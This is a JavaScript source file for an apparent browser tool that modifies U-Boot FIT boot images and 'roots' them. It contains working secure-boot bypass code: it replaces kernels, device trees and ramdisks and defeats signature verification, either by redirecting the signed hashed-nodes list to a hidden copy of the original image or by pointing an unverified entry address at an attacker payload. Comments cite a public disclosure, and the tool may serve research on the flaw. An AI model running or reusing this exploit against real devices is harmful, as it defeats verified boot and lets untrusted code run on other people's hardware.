/**
 * FIT image operations: validation, DT model change, kernel replacement,
 * hash recalculation, signature removal.
 */

const FitOps = (() => {

  /**
   * CRC32 implementation (IEEE polynomial).
   */
  const crc32Table = (() => {
    const table = new Uint32Array(256);
    for (let i = 0; i < 256; i++) {
      let c = i;
      for (let j = 0; j < 8; j++) {
        c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
      }
      table[i] = c;
    }
    return table;
  })();

  function crc32(data) {
    let crc = 0xFFFFFFFF;
    for (let i = 0; i < data.byteLength; i++) {
      crc = crc32Table[(crc ^ data[i]) & 0xFF] ^ (crc >>> 8);
    }
    return (crc ^ 0xFFFFFFFF) >>> 0;
  }

  /**
   * SHA-256 via Web Crypto API (async).
   */
  async function sha256(data) {
    const hash = (typeof crypto !== 'undefined' && crypto.subtle)
      ? await crypto.subtle.digest('SHA-256', data)
      : await ShaFallback.sha256(data);
    return new Uint8Array(hash);
  }

  /**
   * Decompress gzip data using DecompressionStream API.
   */
  async function gunzip(data) {
    const ds = new DecompressionStream('gzip');
    const writer = ds.writable.getWriter();
    writer.write(data);
    writer.close();
    const reader = ds.readable.getReader();
    const chunks = [];
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      chunks.push(value);
    }
    const totalLen = chunks.reduce((s, c) => s + c.byteLength, 0);
    const result = new Uint8Array(totalLen);
    let off = 0;
    for (const c of chunks) {
      result.set(c, off);
      off += c.byteLength;
    }
    return result;
  }

  /**
   * Read a load/entry address off an image node.  FIT writes them as
   * #address-cells big-endian words, so four or eight bytes; anything else is
   * not an address this tool is going to reason about.
   */
  function readAddress(node, name) {
    const data = FDT.getProperty(node, name);
    if (!data || (data.byteLength !== 4 && data.byteLength !== 8)) return null;
    const dv = new DataView(data.buffer, data.byteOffset, data.byteLength);
    return data.byteLength === 4
      ? dv.getUint32(0)
      : dv.getUint32(0) * 0x100000000 + dv.getUint32(4);
  }

  /**
   * A kernel_noload image is booted where it lies.  bootm replaces its load
   * address with the position of the image data and takes entry as an offset
   * from there, so neither property means what it does elsewhere.
   */
  function isNoload(node) {
    return FDT.getStringProperty(node, 'type') === 'kernel_noload';
  }

  /**
   * How many cells an address of this image node takes: what it already uses,
   * else the FIT root's #address-cells, else one.
   */
  function addressCells(node, root) {
    for (const name of ['entry', 'load']) {
      const data = FDT.getProperty(node, name);
      if (data && (data.byteLength === 4 || data.byteLength === 8)) return data.byteLength / 4;
    }
    const cells = FDT.getProperty(root, '#address-cells');
    if (cells && cells.byteLength >= 4) {
      const n = new DataView(cells.buffer, cells.byteOffset, 4).getUint32(0);
      if (n === 1 || n === 2) return n;
    }
    return 1;
  }

  /**
   * Encode an address into the given number of cells.
   */
  function addressBytes(value, cells) {
    if (cells === 1 && value > 0xffffffff) {
      throw new Error(`Address 0x${value.toString(16)} does not fit the single address cell this FIT uses`);
    }
    const data = new Uint8Array(cells * 4);
    const dv = new DataView(data.buffer);
    if (cells === 2) {
      dv.setUint32(0, Math.floor(value / 0x100000000));
      dv.setUint32(4, value % 0x100000000);
    } else {
      dv.setUint32(0, value);
    }
    return data;
  }

  /**
   * Validate a FIT image. Returns { valid, tree, images, error }.
   */
  function validate(buffer) {
    let tree;
    try {
      tree = FDT.parse(buffer);
    } catch (e) {
      return { valid: false, tree: null, images: [], error: e.message };
    }

    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) {
      return { valid: false, tree, images: [], error: 'No /images node found in FIT' };
    }
    if (imagesNode.children.length === 0) {
      return { valid: false, tree, images: [], error: 'No image entries under /images' };
    }

    const images = imagesNode.children.map(img => {
      const isOrig = img.name.startsWith('orig-');
      const type = isOrig ? 'exploit artifact' : (FDT.getStringProperty(img, 'type') || 'unknown');
      const desc = FDT.getStringProperty(img, 'description') || '';
      const data = FDT.getProperty(img, 'data');
      const dataSizeProp = FDT.getProperty(img, 'data-size');
      const size = data ? data.byteLength
        : dataSizeProp ? new DataView(dataSizeProp.buffer, dataSizeProp.byteOffset, 4).getUint32(0)
        : 0;
      const compression = FDT.getStringProperty(img, 'compression') || 'none';
      const arch = FDT.getStringProperty(img, 'arch') || '';
      const isX509 = data && data.byteLength >= 2 && data[0] === 0x30 && data[1] === 0x82;
      // SoCFPGA VAB: certificate appended at end of image data.
      // Last 4 bytes = cert size (LE), then at end - certSz - 4: SDM_CERT_MAGIC 0x25D04E7F (LE).
      let isVAB = false;
      if (data && data.byteLength >= 8) {
        const dv = new DataView(data.buffer, data.byteOffset, data.byteLength);
        const certSz = dv.getUint32(data.byteLength - 4, true);
        const certOff = data.byteLength - certSz - 4;
        if (certSz > 0 && certOff >= 0 && certOff + 4 <= data.byteLength) {
          isVAB = dv.getUint32(certOff, true) === 0x25D04E7F;
        }
      }
      // load and entry are unverified in a per-image signing scheme, which is
      // what the entry-address method lives off.  An entry that does not point
      // into the image it belongs to is the symptom Rasmus Villemoes suggested
      // checking for, so the table can show it -- except for kernel_noload,
      // where entry is an offset and the comparison would mean nothing.
      const load = readAddress(img, 'load');
      const entry = readAddress(img, 'entry');
      const entryEscapes = !isNoload(img) &&
        entry !== null && load !== null && size > 0 &&
        (entry < load || entry >= load + size);
      return { name: img.name, type, description: desc, size, compression, arch,
        isOrig, isX509, isVAB, load, entry, entryEscapes };
    });

    const desc = FDT.getStringProperty(tree.root, 'description') || '';

    // Scan configurations and signatures
    const signatures = [];
    const configs = [];
    const configsNode = FDT.findNode(tree.root, ['configurations']);
    const defaultConfig = configsNode ? (FDT.getStringProperty(configsNode, 'default') || '') : '';
    if (configsNode) {
      for (const cfg of configsNode.children) {
        const cfgSigs = [];
        const imageRefs = [];
        for (const child of cfg.children) {
          if (child.name.startsWith('signature')) {
            const algo = FDT.getStringProperty(child, 'algo') || 'unknown';
            cfgSigs.push({ name: child.name, algo });
            signatures.push({ config: cfg.name, name: child.name, algo });
          }
        }
        // Collect image references (kernel, fdt, ramdisk, etc.)
        const imageNames = new Set(imagesNode.children.map(c => c.name));
        const refProps = ['kernel', 'fdt', 'ramdisk', 'loadables', 'firmware', 'standalone', 'fpga', 'setup'];
        for (const prop of refProps) {
          const vals = FDT.getStringListProperty(cfg, prop);
          if (vals) {
            for (const val of vals) {
              if (imageNames.has(val)) imageRefs.push({ role: prop, image: val });
            }
          }
        }
        const cfgDesc = FDT.getStringProperty(cfg, 'description') || '';
        configs.push({ name: cfg.name, description: cfgDesc, imageRefs, signatures: cfgSigs, isDefault: cfg.name === defaultConfig });
      }
    }
    const hasSignatures = signatures.length > 0;
    const numConfigs = configs.length;
    const numSignedConfigs = configs.filter(c => c.signatures.length > 0).length;
    const sigAlgos = [...new Set(signatures.map(s => s.algo))];

    return { valid: true, tree, images, description: desc, signatures, hasSignatures, numConfigs, numSignedConfigs, sigAlgos, configs, error: null };
  }

  /**
   * Find the flat_dt (device tree) image node under /images.
   */
  function findFdtImage(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return null;
    return imagesNode.children.find(img => {
      const type = FDT.getStringProperty(img, 'type');
      return type === 'flat_dt';
    }) || null;
  }

  /**
   * Find all flat_dt image nodes under /images.
   */
  function findAllFdtImages(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return [];
    return imagesNode.children.filter(img => {
      const type = FDT.getStringProperty(img, 'type');
      return type === 'flat_dt';
    });
  }

  /**
   * Find the kernel image node under /images.
   */
  function findKernelImage(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return null;
    return imagesNode.children.find(img => {
      const type = FDT.getStringProperty(img, 'type');
      return type === 'kernel' || type === 'kernel_noload';
    }) || null;
  }

  /**
   * Find all kernel image nodes under /images.
   */
  function findAllKernelImages(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return [];
    return imagesNode.children.filter(img => {
      const type = FDT.getStringProperty(img, 'type');
      return type === 'kernel' || type === 'kernel_noload';
    });
  }

  /**
   * Find all ramdisk image nodes under /images.
   */
  function findAllRamdiskImages(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return [];
    return imagesNode.children.filter(img => {
      const type = FDT.getStringProperty(img, 'type');
      return type === 'ramdisk';
    });
  }

  /**
   * Change the DT model property in the nested FDT image.
   * Parses the nested DTB, modifies the model, serializes it back.
   */
  function changeDtModel(tree, newModel) {
    const fdtImg = findFdtImage(tree);
    if (!fdtImg) {
      throw new Error('No flat_dt image found in FIT');
    }

    const dtData = FDT.getProperty(fdtImg, 'data');
    if (!dtData) {
      throw new Error('flat_dt image has no data property');
    }

    // Parse the nested DTB
    const innerTree = FDT.parse(dtData);

    // Modify the model property on the root node
    FDT.setProperty(innerTree.root, 'model', newModel);

    // Serialize back
    const newDtData = FDT.serialize(innerTree);

    // Replace data in the outer FIT
    FDT.setProperty(fdtImg, 'data', newDtData);

    // Update data-size if present
    const dataSizeProp = fdtImg.properties.find(p => p.name === 'data-size');
    if (dataSizeProp) {
      const buf = new ArrayBuffer(4);
      new DataView(buf).setUint32(0, newDtData.byteLength);
      dataSizeProp.data = new Uint8Array(buf);
    }
  }

  /**
   * Replace the kernel image data with new binary data.
   */
  function replaceKernel(tree, kernelData) {
    const kernelImg = findKernelImage(tree);
    if (!kernelImg) {
      throw new Error('No kernel image found in FIT');
    }

    FDT.setProperty(kernelImg, 'data', kernelData);

    // Update data-size if present
    const dataSizeProp = kernelImg.properties.find(p => p.name === 'data-size');
    if (dataSizeProp) {
      const buf = new ArrayBuffer(4);
      new DataView(buf).setUint32(0, kernelData.byteLength);
      dataSizeProp.data = new Uint8Array(buf);
    }
  }

  /**
   * Remove all signature nodes from under /images/* and /configurations/*.
   */
  function removeSignatures(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (imagesNode) {
      for (const img of imagesNode.children) {
        img.children = img.children.filter(c => !c.name.startsWith('signature'));
      }
    }

    const configsNode = FDT.findNode(tree.root, ['configurations']);
    if (configsNode) {
      for (const cfg of configsNode.children) {
        cfg.children = cfg.children.filter(c => !c.name.startsWith('signature'));
      }
    }
  }

  /**
   * Recalculate hashes for a single image node given its data.
   */
  async function recalcHashesForNode(node, data) {
    for (const hashNode of node.children) {
      if (!hashNode.name.startsWith('hash')) continue;

      const algo = FDT.getStringProperty(hashNode, 'algo');
      if (!algo) continue;

      if (algo === 'crc32') {
        const crcVal = crc32(data);
        const buf = new ArrayBuffer(4);
        new DataView(buf).setUint32(0, crcVal);
        FDT.setProperty(hashNode, 'value', new Uint8Array(buf));
      } else if (algo === 'sha256' || algo === 'sha-256') {
        const hashVal = await sha256(data);
        FDT.setProperty(hashNode, 'value', hashVal);
      } else if (algo === 'sha1' || algo === 'sha-1') {
        const hash = (typeof crypto !== 'undefined' && crypto.subtle)
          ? await crypto.subtle.digest('SHA-1', data)
          : await ShaFallback.sha1(data);
        FDT.setProperty(hashNode, 'value', new Uint8Array(hash));
      } else if (algo === 'md5') {
        const prop = hashNode.properties.find(p => p.name === 'value');
        if (prop) prop.data = new Uint8Array(0);
      }
    }
  }

  /**
   * Recalculate hashes for all image nodes under /images.
   */
  async function recalculateHashes(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return;

    for (const img of imagesNode.children) {
      const data = FDT.getProperty(img, 'data');
      if (!data) continue;
      await recalcHashesForNode(img, data);
    }
  }

  /**
   * Rewrite hashed-nodes in signature nodes to point at /images/<container>/<name>.
   */
  function fixupSignatures(tree, imageName, containerName) {
    const oldPrefix = `/images/${imageName}`;
    const newPrefix = `/images/${containerName}/${imageName}`;

    const configsNode = FDT.findNode(tree.root, ['configurations']);
    if (!configsNode) return;

    const decoder = new TextDecoder();
    const encoder = new TextEncoder();

    for (const conf of configsNode.children) {
      for (const sig of conf.children) {
        if (!sig.name.startsWith('signature')) continue;

        const hashedData = FDT.getProperty(sig, 'hashed-nodes');
        if (!hashedData) continue;

        // Parse null-separated string list (trailing null)
        let raw = decoder.decode(hashedData);
        // Strip trailing nulls then split on null
        const entries = raw.replace(/\0+$/, '').split('\0');
        const newEntries = entries.map(e => {
          if (e === oldPrefix || e.startsWith(oldPrefix + '/')) {
            return newPrefix + e.slice(oldPrefix.length);
          }
          return e;
        });

        // Rejoin with null separators + trailing null
        const joined = newEntries.join('\0') + '\0';
        FDT.setProperty(sig, 'hashed-nodes', encoder.encode(joined));
      }
    }
  }

  /**
   * Bypass methods, in the order the drop-down offers them.  opts.method
   * selects one; the first entry is the default.
   *
   *   hashed-nodes  Move the signed image into an orig- container, redirect
   *                 the signature's hashed-nodes list at the copy and leave
   *                 the patched node in its place, where lookups find it.
   *   entry-address Leave the signed image completely alone, carry the payload
   *                 in an extra property of its node and point the image's
   *                 entry at it.  For FITs signed with required = "image",
   *                 where the signature covers the data and nothing else.
   *   sanity-check  Patch the signed image where it stands and touch nothing
   *                 else.  The signature keeps covering data that no longer
   *                 matches it, so verification must fail: this is the
   *                 negative control, not a bypass.
   */
  const METHODS = ['hashed-nodes', 'entry-address', 'sanity-check'];

  function methodOf(opts) {
    const method = (opts && opts.method) || METHODS[0];
    if (!METHODS.includes(method)) throw new Error(`Unknown bypass method '${method}'`);
    return method;
  }

  /**
   * Move the payload into an image node: new data, no compression, a (Pwnd)
   * marker in the description and, unless the caller opted out, fresh hashes.
   */
  async function patchImageNode(node, newData, opts) {
    FDT.setProperty(node, 'data', newData instanceof Uint8Array ? newData : new Uint8Array(newData));

    // Set compression to none
    FDT.setProperty(node, 'compression', 'none');

    // Append (Pwnd) to description
    const desc = FDT.getStringProperty(node, 'description');
    if (desc !== null && !desc.includes('(Pwnd)')) {
      FDT.setProperty(node, 'description', desc + ' (Pwnd)');
    }

    // Recalculate hashes for the modified node
    if (!opts || opts.recomputeHashes !== false) {
      await recalcHashesForNode(node, FDT.getProperty(node, 'data'));
    }
  }

  /**
   * Property the entry-address payload travels in, next to the image whose
   * entry points at it.  The name is deliberately obvious: this one is not
   * hiding from anybody, it is riding along in plain sight because nothing
   * verifies it.
   */
  const PAYLOAD_PROP = 'pwn-payload';

  /**
   * Properties through which a configuration names an image.
   */
  const CONFIG_IMAGE_PROPS = [
    'kernel', 'fdt', 'ramdisk', 'firmware', 'setup', 'loadables', 'fpga', 'script',
  ];

  /**
   * Images covered by a configuration signature, by node name.
   *
   * Reading hashed-nodes is not enough to answer this.  U-Boot stopped
   * trusting that property in 2092322b31cc ("boot: Add
   * fit_config_get_hash_list()", v2026.04-rc4) and now rebuilds the signed
   * node list from the configuration's own image references, so a FIT whose
   * hashed-nodes was stripped still verifies -- and still notices an image
   * node that changed.  The references are therefore what decides, and
   * hashed-nodes is consulted on top for bootloaders that do read it.
   */
  function configSignedImages(tree) {
    const covered = new Set();
    const configsNode = FDT.findNode(tree.root, ['configurations']);
    if (!configsNode) return covered;

    for (const conf of configsNode.children) {
      const signatures = conf.children.filter(c => c.name.startsWith('signature'));
      if (signatures.length === 0) continue;

      for (const prop of CONFIG_IMAGE_PROPS) {
        for (const name of FDT.getStringListProperty(conf, prop) || []) covered.add(name);
      }

      for (const sig of signatures) {
        for (const path of FDT.getStringListProperty(sig, 'hashed-nodes') || []) {
          const image = /^\/images\/([^/]+)$/.exec(path);
          if (image) covered.add(image[1]);
        }
      }
    }
    return covered;
  }

  /**
   * The address the FIT itself is loaded at -- bootm's own argument, not any
   * image's load address.  Accepts a number or the text the UI field holds.
   */
  function fitLoadAddress(opts) {
    const raw = opts && opts.fitLoadAddress;
    const value = typeof raw === 'string' ? Number(raw.trim() || NaN) : raw;
    if (typeof value !== 'number' || !Number.isSafeInteger(value) || value < 0) {
      throw new Error('The entry-address method needs the address the FIT itself is ' +
        'loaded at, e.g. 0x82000000');
    }
    return value;
  }

  /**
   * Signature bypass via the unverified entry point.
   *
   * With required = "image" the signature covers the image's data property and
   * nothing else.  load, entry and anything else the image node carries stay
   * outside it, so the payload never has to displace the signed data: it
   * travels in a property of its own beside it and entry is moved onto it.
   * The bootloader verifies the vendor's kernel, copies it to load, and then
   * jumps into the attacker's bytes.
   *
   * Rasmus Villemoes demonstrated this on a BeagleBone Black in
   * https://lore.kernel.org/u-boot/87h5quqqln.fsf@prevas.dk/ -- a thunk pasted
   * into the FIT with fdtput, entry moved onto it, bootm happy -- and argued
   * that required = "image" "offers no protection at all" next to a hole like
   * that.  Bounds-checking entry against [load, load+size) would only force
   * the attacker to find a useful instruction inside the signed image instead.
   *
   * The payload's address is not known until the blob has been serialized, so
   * entry gets a placeholder of the right width here and placeEntryPoints()
   * fills it in once the layout is final.
   */
  function entryBypassSignature(targetNode, newData, root) {
    const payload = newData instanceof Uint8Array ? newData : new Uint8Array(newData);
    FDT.setProperty(targetNode, PAYLOAD_PROP, payload);
    FDT.setProperty(targetNode, 'entry', addressBytes(0, addressCells(targetNode, root)));
  }

  /**
   * Resolve the entry addresses entryBypassSignature() left as placeholders.
   *
   * Serialize once to see where each payload property landed, add the address
   * the FIT is loaded at, write the entries and serialize again.  The second
   * pass lays the blob out identically -- entry keeps the width the first pass
   * gave it -- so the offsets still hold, and the size is checked rather than
   * trusted.
   */
  function placeEntryPoints(tree, base) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    const targets = imagesNode.children.filter(img => FDT.getProperty(img, PAYLOAD_PROP));
    const draft = FDT.serialize(tree);

    for (const img of targets) {
      const offset = FDT.propertyOffset(draft, ['images', img.name], PAYLOAD_PROP);
      if (offset === null) throw new Error(`Lost the payload of '${img.name}' while serializing`);

      let value;
      if (isNoload(img)) {
        /*
         * A kernel_noload image is never copied anywhere, so its entry is not
         * an address at all: bootm overwrites load with where the data already
         * sits and adds that to entry (images.ep += images.os.image_start).
         * What belongs in the property is therefore the distance from the data
         * to the payload, and the FIT's own load address cancels out.
         */
        const dataOffset = FDT.propertyOffset(draft, ['images', img.name], 'data');
        if (dataOffset === null) throw new Error(`Image '${img.name}' has no data to offset from`);
        value = offset - dataOffset;
      } else {
        if (base === null) throw new Error('No load address to place the entry point against');
        value = base + offset;
      }

      FDT.setProperty(img, 'entry',
        addressBytes(value, FDT.getProperty(img, 'entry').byteLength / 4));
    }

    const out = FDT.serialize(tree);
    if (out.byteLength !== draft.byteLength) {
      throw new Error('FIT layout moved while the entry points were being placed');
    }
    return out;
  }

  /**
   * Signature bypass: clone original node, replace data, redirect signatures.
   *
   * Each bypassed image gets its own container node placed immediately after
   * the target in /images.  This preserves the binary ordering of cloned
   * nodes, which is critical because fdt_find_regions walks the FDT linearly
   * and the concatenated hash input must match the original region order.
   *
   * The other two methods skip all of that: entry-address leaves the signed
   * node's contents alone and only moves its entry, and sanity-check patches
   * the signed node itself, leaving the signature to fail over data it no
   * longer matches.
   */
  async function bypassSignature(tree, targetNodeName, newData, opts) {
    const method = methodOf(opts);
    const redirectSignatures = !opts || opts.redirectSignatures !== false;
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) throw new Error('No /images node');

    // Find target node
    const targetNode = imagesNode.children.find(c => c.name === targetNodeName);
    if (!targetNode) throw new Error(`Image node '${targetNodeName}' not found`);

    if (method === 'entry-address') {
      // entry lives in the image node, so a configuration signature covers it
      // and moving it would break that digest for nothing.  That FIT wants the
      // hashed-nodes method; this one is for required = "image".
      if (configSignedImages(tree).has(targetNodeName)) {
        throw new Error(`/images/${targetNodeName} is covered by a configuration ` +
          'signature, whose digest includes the entry property. The entry-address ' +
          'method applies to FITs signed with required = "image"');
      }
      entryBypassSignature(targetNode, newData, tree.root);
      return;
    }

    if (method === 'sanity-check') {
      await patchImageNode(targetNode, newData, opts);
      return;
    }

    // Deep clone the original
    const original = FDT.cloneNode(targetNode);

    // Create a per-image container right after the target node
    const containerName = 'orig-' + targetNodeName;
    let origNode = imagesNode.children.find(c => c.name === containerName);
    if (!origNode) {
      origNode = { name: containerName, properties: [], children: [] };
      const targetIdx = imagesNode.children.indexOf(targetNode);
      imagesNode.children.splice(targetIdx + 1, 0, origNode);
    }

    // Add clone + sentinel if not already there
    if (!origNode.children.some(c => c.name === targetNodeName)) {
      origNode.children.push(original);
      if (!origNode.children.some(c => c.name === 'sentinel')) {
        origNode.children.push({ name: 'sentinel', properties: [], children: [] });
      }
    }

    // Replace data, compression, description and hashes on the node that
    // stays behind under the signed name -- the one that gets booted
    await patchImageNode(targetNode, newData, opts);

    // Redirect signature references
    if (redirectSignatures) {
      fixupSignatures(tree, targetNodeName, containerName);
    }
  }

  /**
   * Find the ramdisk image node under /images.
   */
  function findRamdiskImage(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return null;
    return imagesNode.children.find(img => {
      const type = FDT.getStringProperty(img, 'type');
      return type === 'ramdisk';
    }) || null;
  }

  /**
   * Full rooting operation: modify DT model, replace kernel, bypass signatures, serialize.
   */
  async function root(buffer, options) {
    const result = validate(buffer);
    if (!result.valid) {
      throw new Error(result.error);
    }

    const tree = result.tree;
    const u8buf = buffer instanceof Uint8Array ? buffer : new Uint8Array(buffer);
    const method = methodOf(options);

    // Redirecting the entry point is all the entry-address method does: every
    // signed image keeps its contents, so there is no variant of it that
    // rewrites a device tree or grows a ramdisk.  Refuse those combinations
    // here rather than handing back a FIT whose signatures quietly fail.
    let base = null;
    if (method === 'entry-address') {
      if (options.changeDtModel || options.appendInitramfs) {
        throw new Error('The entry-address method only moves the entry point: it cannot ' +
          'change the DT model or append an initramfs, which would break the signature ' +
          'over the image data');
      }
      if (!options.replaceKernel || !options.kernelData) {
        throw new Error('The entry-address method needs a payload: enable the kernel replacement');
      }
      // Only an image that gets copied to a load address needs one: for
      // kernel_noload the entry is an offset and the address cancels out.
      if (findAllKernelImages(tree).some(img => !isNoload(img))) {
        base = fitLoadAddress(options);
      }
    }

    // Resolve any external data references
    FDT.resolveExternalData(tree.root, u8buf);

    if (options.changeDtModel) {
      const fdtImages = findAllFdtImages(tree);
      if (fdtImages.length === 0) throw new Error('No flat_dt image found in FIT');

      for (const fdtImg of fdtImages) {
        let dtData = FDT.getProperty(fdtImg, 'data');
        if (!dtData) continue;

        // Decompress if compressed
        const compression = FDT.getStringProperty(fdtImg, 'compression') || 'none';
        if (compression === 'gzip') {
          dtData = await gunzip(dtData);
        }

        const innerTree = FDT.parse(dtData);
        const origModel = FDT.getStringProperty(innerTree.root, 'model') || '';
        FDT.setProperty(innerTree.root, 'model', origModel + ' [rooted by ifitfitsisits.com]');
        const newDtData = FDT.serialize(innerTree);

        await bypassSignature(tree, fdtImg.name, newDtData, options);
      }
    }

    if (options.replaceKernel && options.kernelData) {
      const kernelImages = findAllKernelImages(tree);
      if (kernelImages.length === 0) throw new Error('No kernel image found in FIT');
      for (const kernelImg of kernelImages) {
        await bypassSignature(tree, kernelImg.name, new Uint8Array(options.kernelData), options);
      }
    }

    if (options.appendInitramfs && options.initramfsData) {
      const ramdiskImages = findAllRamdiskImages(tree);
      if (ramdiskImages.length === 0) throw new Error('No ramdisk image found in FIT');

      for (const ramdiskImg of ramdiskImages) {
        let existingData = FDT.getProperty(ramdiskImg, 'data');
        if (!existingData) continue;

        // Decompress if compressed
        const compression = FDT.getStringProperty(ramdiskImg, 'compression') || 'none';
        if (compression === 'gzip') {
          existingData = await gunzip(existingData);
        }

        // Concatenate existing ramdisk + new initramfs (CPIO archives are concatenable)
        const appendData = new Uint8Array(options.initramfsData);
        const combined = new Uint8Array(existingData.byteLength + appendData.byteLength);
        combined.set(existingData, 0);
        combined.set(appendData, existingData.byteLength);

        await bypassSignature(tree, ramdiskImg.name, combined, options);
      }
    }

    if (method === 'entry-address') {
      return placeEntryPoints(tree, base);
    }

    return FDT.serialize(tree);
  }

  return {
    validate,
    root,
    crc32,
    sha256,
    METHODS,
    PAYLOAD_PROP,
    findFdtImage,
    findKernelImage,
    findRamdiskImage,
  };
})();
